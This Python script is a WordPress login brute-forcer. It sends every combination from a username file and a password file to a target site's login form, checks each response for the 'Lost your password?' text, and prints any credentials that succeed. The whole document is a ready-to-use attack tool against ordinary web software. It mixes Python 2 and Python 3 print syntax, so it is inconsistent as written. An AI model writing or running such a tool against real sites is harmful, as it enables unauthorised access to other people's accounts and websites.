import os
import sys
import time
import requests

login_url = sys.argv[1]
user_given_file = sys.argv[2]
pass_given_file = sys.argv[3]

#password
pass_file = open(pass_given_file, 'r')
passwords = list(pass_file)

#username
username_file = open(user_given_file, 'r')
users = list(username_file)

hr = "-" * 65

print (hr)
print ("WPLogin url: <" + login_url + '>')
print ("Users file: <" + user_given_file + '>')
print ("Password file: <" + pass_given_file + '>')
print (hr)

def do_login(user, password):
		
	found = True
	values = {'log': user, 'pwd': password}
	r = requests.post(login_url, data=values)
	if "Lost your password?" in r.content:
		found = False
	if "blocked" in r.content:
		print ("Account blocked")
		import sys
		sys.exit()

	return found


try:
	#Removes the unwanted \n from all passwords
	passwords = list(map(lambda x:x.strip(),passwords))
	users = list(map(lambda x:x.strip(),users))

	for password in passwords:
		for user in users:
			worked = do_login(user, password)
			time.sleep(0.5)
			print (hr)
			print (user + ":" + password)
			if worked:
				print (hr)
				print  ('\x1b[6;30;42m' + "Worked: [" + user + "]:[" + password + "]" + '\x1b[0m')
				print (hr)
				sys.exit()

except KeyboardInterrupt:
	print "Script was stopped."
except IOError:
    print "**Please Provide Correct Path of Password File**"
except requests.exceptions.HTTPError as err:
	print err


